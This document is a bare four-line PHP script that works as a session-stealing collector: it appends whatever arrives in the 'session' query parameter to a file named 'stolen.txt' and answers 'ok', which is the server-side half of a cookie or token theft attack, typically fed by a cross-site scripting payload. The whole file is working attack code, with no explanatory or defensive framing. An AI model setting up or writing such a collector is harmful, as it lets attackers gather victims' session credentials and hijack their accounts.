<?php
file_put_contents("stolen.txt", $_GET['session'] . "\n", FILE_APPEND);
echo "ok";
?>
